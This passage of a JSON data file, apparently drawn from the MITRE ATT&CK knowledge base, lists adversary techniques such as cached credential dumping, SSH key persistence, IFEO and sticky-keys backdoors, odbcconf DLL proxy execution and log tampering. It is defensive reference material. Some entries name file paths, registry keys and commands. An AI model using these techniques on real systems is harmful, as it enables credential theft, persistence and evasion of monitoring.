    "description": "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)On Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to obtain the plaintext password.(Citation: Brining MimiKatz to Unix) With SYSTEM or sudo access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.(Citation: Brining MimiKatz to Unix)Note: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)",
    "similar_words": [
      "Cached Domain Credentials"
    ],
    "id": "T1003.005"
  },
  "attack-pattern--6b57dc31-b814-4a03-8706-28bc20d739c4": {
    "name": "SSH Authorized Keys",
    "example_uses": [
      "has dropped an SSH-authorized key in the `/root/.ssh` folder in order to access a compromised server with SSH.",
      "has the ability to add the public key of its handlers to the authorized_keys file to maintain persistence on an infected host.",
      "will create an ssh key if necessary with the ssh-keygen -t rsa -f $HOME/.ssh/id_rsa -P command.  will upload a private key file to the server to remotely access the host without a password.",
      "creates a new key pair with ssh-keygen and drops the newly created user key in authorized_keys to enable remote login.",
      "has added RSA keys in authorized_keys.",
      "has added SSH authorized_keys under root or other users at the Linux level on compromised network devices."
    ],
    "description": "Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host. Linux distributions, macOS, and ESXi hypervisors commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under &lt;user-home&gt;/.ssh/authorized_keys (or, on ESXi, `/etc/ssh/keys-<username>/authorized_keys`).(Citation: SSH Authorized Keys) Users may edit the systems SSH config file to modify the directives `PubkeyAuthentication` and `RSAAuthentication` to the value `yes` to ensure public key and RSA authentication are enabled, as well as modify the directive `PermitRootLogin` to the value `yes` to enable root authentication via SSH.(Citation: Broadcom ESXi SSH) The SSH config file is usually located under /etc/ssh/sshd_config.Adversaries may modify SSH authorized_keys files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLIs add-metadata command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. SSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)",
    "similar_words": [
      "SSH Authorized Keys"
    ],
    "id": "T1098.004"
  },
  "attack-pattern--6c2957f9-502a-478c-b1dd-d626c0659413": {
    "name": "Network Security Appliances",
    "example_uses": [
      "has identified target network security measures as part of pre-compromise reconnaissance."
    ],
    "description": "Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
    "similar_words": [
      "Network Security Appliances"
    ],
    "id": "T1590.006"
  },
  "attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6": {
    "name": "Image File Execution Options Injection",
    "example_uses": [
      "created an Image File Execution Options (IFEO) Debugger registry value for the process dllhost.exe to trigger the installation of .",
      "has the ability to use image file execution options for persistence if it detects it is running with admin privileges on a Windows version newer than Windows 7.",
      "During the  campaign  modified and added entries within HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options to maintain persistence."
    ],
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an applications IFEO will be prepended to the applications name, effectively launching the new process under the debugger (e.g., C:\\dbg\\ntsd.exe -g  notepad.exe). (Citation: Microsoft Dev Blog IFEO Mar 2010)IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as Debugger values in the Registry under HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable> where &lt;executable&gt; is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.Malware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",
    "similar_words": [
      "Image File Execution Options Injection"
    ],
    "id": "T1546.012"
  },
  "attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071": {
    "name": "Odbcconf",
    "example_uses": [
      "has used odbcconf to proxy the execution of malicious DLL files.",
      "can use `odbcconf.exe` to run DLLs on targeted hosts.",
      "uses the Windows utility odbcconf.exe to execute malicious commands using the regsvr flag to execute DLLs and bypass application control mechanisms that are not monitoring for odbcconf.exe abuse."
    ],
    "description": "Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a REGSVR flag that can be misused to execute DLLs (ex: odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) ",
    "similar_words": [
      "Odbcconf"
    ],
    "id": "T1218.008"
  },
  "attack-pattern--6e561441-8431-4773-a9b8-ccf28ef6a968": {
    "name": "Search Engines",
    "example_uses": [
      "has searched for vulnerabilities tools and geopolitical trends on Google to target victims.",
      "involved use of search engines to research victim servers."
    ],
    "description": "Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).",
    "similar_words": [
      "Search Engines"
    ],
    "id": "T1593.002"
  },
  "attack-pattern--6ee2dc99-91ad-4534-a7d8-a649358c331f": {
    "name": "Business Relationships",
    "example_uses": [
      "has collected open source information to identify relationships between organizations for targeting purposes.",
      "has gathered detailed knowledge of an organization's supply chain relationships.",
      "In preparation for its attack against the 2018 Winter Olympics  conducted online research of partner organizations listed on an official PyeongChang Olympics partnership site."
    ],
    "description": "Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organizations business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victims hardware and software resources.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
    "similar_words": [
      "Business Relationships"
    ],
    "id": "T1591.002"
  },
  "attack-pattern--6fa224c7-5091-4595-bf15-3fc9fe2f2c7c": {
    "name": "Temporary Elevated Cloud Access",
    "example_uses": [],
    "description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. Just-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023)Account impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) Many cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)While users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",
    "similar_words": [
      "Temporary Elevated Cloud Access"
    ],
    "id": "T1548.005"
  },
  "attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197": {
    "name": "Process Doppelgänging",
    "example_uses": [
      "abuses NTFS transactions to launch and conceal malicious processes.",
      "can inject into a target process using process doppelgnging.",
      "has used  to evade security software while deploying tools on compromised systems."
    ],
    "description": "Adversaries may inject malicious code into process via process doppelgnging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgnging is a method of executing arbitrary code in the address space of a separate live process. Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgnging Dec 2017)Adversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgnging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgnging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. (Citation: BlackHat Process Doppelgnging Dec 2017)Process Doppelgnging is implemented in 4 steps (Citation: BlackHat Process Doppelgnging Dec 2017):* Transact  Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.* Load  Create a shared section of memory and load the malicious executable.* Rollback  Undo changes to original executable, effectively removing malicious code from the file system.* Animate  Create a process from the tainted section of memory and initiate execution.This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgnging may evade detection from security products since the execution is masked under a legitimate process. ",
    "similar_words": [
      "Process Doppelgänging"
    ],
    "id": "T1055.013"
  },
  "attack-pattern--70857657-bd0b-4695-ad3e-b13f92cac1b4": {
    "name": "Delete Cloud Instance",
    "example_uses": [
      "has deleted the target's systems and resources in the cloud to trigger the organization's incident and crisis response process."
    ],
    "description": "An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)",
    "similar_words": [
      "Delete Cloud Instance"
    ],
    "id": "T1578.003"
  },
  "attack-pattern--70910fbd-58dc-4c1c-8c48-814d11fcd022": {
    "name": "Code Repositories",
    "example_uses": [
      "has searched public code repositories for exposed credentials.",
      "has discovered leaked corporate credentials on public repositories including GitHub."
    ],
    "description": "Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  Adversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.(Citation: GitHub Cloud Service Credentials) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)). **Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003), which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from private and internally hosted code repositories. ",
    "similar_words": [
      "Code Repositories"
    ],
    "id": "T1593.003"
  },
  "attack-pattern--70d81154-b187-45f9-8ec5-295d01255979": {
    "name": "Executable Installer File Permissions Weakness",
    "example_uses": [],
    "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "similar_words": [
      "Executable Installer File Permissions Weakness"
    ],
    "id": "T1574.005"
  },
  "attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5": {
    "name": "Accessibility Features",
    "example_uses": [
      "can leverage WMI debugging to remotely replace binaries like sethc.exe Utilman.exe and Magnify.exe with cmd.exe.",
      "leveraged sticky keys to establish persistence.",
      "replaces the Sticky Keys binary C:\\Windows\\System32\\sethc.exe for persistence.",
      "has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.",
      "actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.",
      "has used sticky keys to launch a command prompt.",
      "used sticky-keys to obtain unauthenticated privileged console access."
    ],
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.Two common accessibility programs are C:\\Windows\\System32\\sethc.exe, launched when the shift key is pressed five times and C:\\Windows\\System32\\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\\, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\\Windows\\System32\\utilman.exe) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)* On-Screen Keyboard: C:\\Windows\\System32\\osk.exe* Magnifier: C:\\Windows\\System32\\Magnify.exe* Narrator: C:\\Windows\\System32\\Narrator.exe* Display Switcher: C:\\Windows\\System32\\DisplaySwitch.exe* App Switcher: C:\\Windows\\System32\\AtBroker.exe",
    "similar_words": [
      "Accessibility Features"
    ],
    "id": "T1546.008"
  },
  "attack-pattern--74d2a63f-3c7b-4852-92da-02d8fbab16da": {
    "name": "Indicator Blocking",
    "example_uses": [
      "has the ability to set the `HKLM:\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\CrashControl\\CrashDumpEnabled` Registry key to `0` in order to disable crash dumps.",
      "developed a custom injector that enables an Event Tracing for Windows (ETW) bypass making malicious processes invisible to Windows logging.",
      "has suppressed all error reporting by calling `SetErrorMode` with 0x8007 as a parameter.",
      "has used the CLEANPULSE utility to insert command line strings into a targeted process to prevent certain log events from occurring.",
      "has the ability to disable Windows Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI) functions.",
      "has the ability to hide memory artifacts and to patch Event Tracing for Windows (ETW) and the Anti Malware Scan Interface (AMSI).",
      "can hook logging functions so that nothing from the backdoor gets sent to the logging facility.",
      "can hook the ZwOpenProcess and GetExtendedTcpTable APIs called by the process of a security product to hide PIDs and TCP records from detection.",
      "hooks system functions to prevent the user from seeing malicious files (`readdir` `realpath` `readlink` `stat` `open` and variants) hide process activity (`ps` and `readdir64`) and socket activity (`open` and `fopen`).",
      "can disable the Fortinet daemons `moglogd` and `syslogd` to evade detection and logging.",
      "can configure processes to not display certain Windows error messages by through use of the `NtSetInformationProcess`."
    ],
    "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).For example, adversaries may modify the `File` value in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) ETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) Set-EtwTraceProvider cmdlet or by interfacing directly with the Registry to make alterations.In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors. (Citation: LemonDuck) ESXi also leverages syslog, which can be reconfigured via commands such as `esxcli system syslog config set` and `esxcli system syslog config reload`.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)(Citation: Broadcom Configuring syslog on ESXi)",
    "similar_words": [
      "Indicator Blocking"
    ],
    "id": "T1562.006"
  },
  "attack-pattern--7610cada-1499-41a4-b3dd-46467b68d177": {
    "name": "Domain Account",
    "example_uses": [
      "can user PowerView to execute net user commands and create domain accounts.",
      "created high-privileged domain user accounts to maintain access to victim networks.",
      "During the   created privileged domain accounts to be used for further exploitation and lateral movement.",
      "has created and used new accounts within a victim's Active Directory environment to maintain persistence.",
      "has the ability to remotely create accounts on target systems.",
      "The net user username \\password \\domain commands in  can be used to create a domain account.",
      "During the   created two new accounts admin and  (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges.",
      "has created domain accounts.",
      "has a module for creating a new domain user if permissions allow.",
      "created privileged domain accounts during intrusions."
    ],
    "description": "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the net user /add /domain command can be used to create a domain account.(Citation: Savill 1999)Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
    "similar_words": [
      "Domain Account"
    ],
    "id": "T1136.002"
  },
  "attack-pattern--76551c52-b111-4884-bc47-ff3e728f0156": {
    "name": "Employee Names",
    "example_uses": [
      "To support initial access  gained access to databases with information about existing accounts and lists of employees.",
      "has collected victim employee name information.",
      "research of potential victim organizations included the identification and collection of employee information.",
      "has collected lists of names for individuals from targeted organizations."
    ],
    "description": "Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
    "similar_words": [
      "Employee Names"
    ],
    "id": "T1589.003"
  },
  "attack-pattern--768dce68-8d0d-477a-b01d-0eea98b963a1": {
    "name": "Golden Ticket",
    "example_uses": [
      "has used  to generate Kerberos golden tickets.",
      "can leverage its implementation of  to obtain and use golden tickets.",
      "kerberos module can create golden tickets.",
      "can forge a ticket-granting ticket.",
      "incorporates the  framework to allow for Kerberos ticket manipulation specifically for forging Kerberos Golden Tickets."
    ],
    "description": "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.",
    "similar_words": [
      "Golden Ticket"
    ],
    "id": "T1558.001"
  },
  "attack-pattern--774ad5bb-2366-4c13-a8a9-65e50b292e7c": {
    "name": "Client Configurations",
    "example_uses": [
      "has interacted with Office 365 tenants to gather details regarding target's environments."
    ],
    "description": "Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
    "similar_words": [
      "Client Configurations"
    ],
    "id": "T1592.004"
  },
  "attack-pattern--77532a55-c283-4cd2-bc5d-2d0b65e9d88c": {
    "name": "Disable or Modify Cloud Firewall",
    "example_uses": [
      "can allowlist IP addresses in AWS GuardDuty."
    ],
